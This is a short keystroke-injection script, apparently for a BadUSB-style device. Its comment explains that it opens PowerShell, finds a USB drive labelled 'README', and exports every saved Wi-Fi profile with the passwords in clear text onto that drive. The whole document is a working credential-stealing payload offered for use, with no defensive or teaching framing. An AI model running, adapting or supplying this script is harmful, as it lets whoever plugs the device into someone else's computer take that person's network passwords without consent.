//Set up MASS STORAGE. Replace "README" with your MASS STORAGE drive name. This script opens powershell, and moves all saved wifi credentials to the MASS STORAGE drive.

layout('us') 
press("GUI r")
delay(200)
type("powershell\n") 
delay(3000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name \n") 
delay(1200)
type("cd $usbpath.name\n")
delay(1200)
type("netsh wlan export profile key=clear\n")
delay(1200)
type("exit\n")
